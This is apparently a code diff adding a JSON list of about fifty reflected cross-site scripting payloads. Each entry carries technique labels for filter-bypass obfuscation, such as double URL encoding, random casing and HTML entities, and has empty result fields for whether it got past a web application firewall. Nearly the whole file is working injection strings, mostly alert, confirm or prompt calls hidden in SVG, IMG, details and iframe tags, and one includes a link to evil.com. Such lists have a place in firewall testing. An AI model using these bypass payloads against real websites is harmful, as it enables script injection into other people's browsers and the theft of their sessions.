@@ -1,0 +1,402 @@
+[
+  {
+    "payload": "<svg/onmouseover%3Dalert0127//>",
+    "technique": "SVG onEvent_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "onmouseover%3d",
+    "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<svg%20&#x6f;&#x6e;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;='confirm(1)'>",
+    "technique": "SVG onEvent_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253cSCrIpT%253EALErT%25281%2529%253C/scRipt%253e",
+    "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253CImG%2520sRc%253dx%2520oNerrOr%253DAlERt%25281%2529%253E",
+    "technique": "obf_double_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "ONMoUsEovEr= -- 58 /*3*/",
+    "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Csvg/onmouseoverS%256Dalert%25281%2529%253E",
+    "technique": "obf_whitespace_url+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "ONMoUseovEr=",
+    "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Csvg/ONlOad%253DaLeRT%25281%2529%253E",
+    "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Cdetails%2520oNTRanSiTiOnENd%253Dalert%25281%2529%253E&Lqop=ImHe",
+    "technique": "obf_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<IMG SRC%3dX ONCLICK%3DALERT%281%29>",
+    "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253cSvG/OnlOAD%253dALErT%25281%2529%253E",
+    "technique": "obf_whitespace_url+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253cSVg/ONLOAD%253dAlERT%25281%2529%253eClick%2520Me",
+    "technique": "obf_double_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+SVG onEvent_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<details onkeydown='alert(60)'>%253Ca href%253Dhttp%253A//evil.com%253Ftest%253D1%2527%253Etest%253C/a%253E</details>",
+    "technique": "Direct JS Call XSS (manual refine)_non_script_xss+obf_whitespace_url+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "ONmOuSEMOvE= <img src=x onerror=alert(29)> -- 53",
+    "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Csvg/onmouseover%253Dalert%25281%2529%253E",
+    "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+SVG onEvent_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253cSVG/ON mouSeOVEr%253dalert%25281%2529%253e",
+    "technique": "SVG onEvent_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<details ondblclick=\"alert(1)\">test</details>",
+    "technique": "Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253csvg/onlOad%253dalERT%25281%2529%253e",
+    "technique": "obf_double_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Csvg/OnloAd%253DALeRT%25281%2529%253E",
+    "technique": "obf_whitespace_url+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253CsVG/oNloAD%253DaleRt%25281%2529%253E",
+    "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Cimg%252509SRC%253Dx%252509OnErRoR%253DalErt%25281%2529%253e",
+    "technique": "obf_whitespace_url+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<!-- jAvas/* */Cript:confirm(42)&lQOP=sdvg --><IMG SRC=X ONERROR = ALERT(1)>",
+    "technique": "Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<svg/onload%3Dconfirm(80)>",
+    "technique": "Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253CsVG/oNloAd%253DaLeRt%25281%2529%253E",
+    "technique": "obf_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253csVg/oNLOad%253daLeRT%25281%2529%253e",
+    "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253CBodY/%252a%252A/onloAd%253DaLeRT%25281%2529%253E",
+    "technique": "SVG onEvent_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<IMG%20ONERROR=%3DPROMPT%281%29%250AONTOGGLE=ALERT%281%29> -->&mShb=SDVG",
+    "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<IMG%20onsCrOll=\"CONFIRM(1)\"%20Src=X%20oNerROr=aLERT(59)%20>",
+    "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<!-- \uff2f\uff2e\uff23\uff2c\uff29\uff43\uff2b= --><img src=x onerror=alert(1)>",
+    "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Csvg/oNLOAd%253DaLeRT%25281%2529%253E",
+    "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+SVG onEvent_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Csvg/onmouseover%253Dprompt%25281%2529%253E",
+    "technique": "Direct JS Call XSS (manual refine)_non_script_xss+obf_whitespace_url+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253cImg%2520sRc%253Dx%2520OnErRoR%253dAleRt%25281%2529%253E",
+    "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<embed%20onmouseout='prompt(1)'>PROMPT%28</body> <input autofocus>",
+    "technique": "Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%25253cIMG%252520Src%25253dX%252520onErRoR%25253dAleRt%252560XSS%252560%25253e",
+    "technique": "obf_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<svg/onload%3Dalert%281%29>",
+    "technique": "SVG onEvent_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%25253CsCRIPt%25253EaLErT%2525281%252529%25253c/sCriPT%25253e",
+    "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Csvg/onlOad%253dALeRT%25281%2529%253E",
+    "technique": "obf_double_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%25253cIFRAME%252520SRC%25253dJAVASCRIPT%25253aALERT%2525281%252529%25253e",
+    "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+obf_double_url_encode+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%25253cSCrIpT%25253eaLErt%2525281%252529%25253C/scRipt%25253E",
+    "technique": "obf_url_encode+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253cIFRAme%2520srC%253dJavAScrIPT%253aAleRT%25281%2529%253E",
+    "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253CiMG%250ASRC%253dx%250AOnERrOr%253DALErT%25281%2529%253E",
+    "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Csvg/onmouseover%253Dalert%25281%2529%253E",
+    "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253cDIV%2520ONERROR%253dCONFIRM%25281%2529%253e</BODY>",
+    "technique": "obf_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<svg/onload=alert%2813465%29>",
+    "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+SVG onEvent_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<details%20&#x6f;&#x6e;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;='String.fromCharCode(99,111,110,102,105,114,109)(1)'></details>",
+    "technique": "obf_double_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<!-- onmouseover%3d --><img src=x onerror=alert(1)>",
+    "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "jAvas/*%20*/Cript:confirm(67)",
+    "technique": "Direct JS Call XSS (manual refine)_non_script_xss+obf_whitespace_url+obf_case_random_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Csvg/onmouseover%253Dconfirm1%25284096%2529%253Etest%253C/svg%253E&kUWG=SDVG",
+    "technique": "SVG onEvent_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%253Cdetails%2520ontouchend%253Dalert%25281%2529%253E",
+    "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass",
+    "attack_type": "xss_reflected",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  }
+]
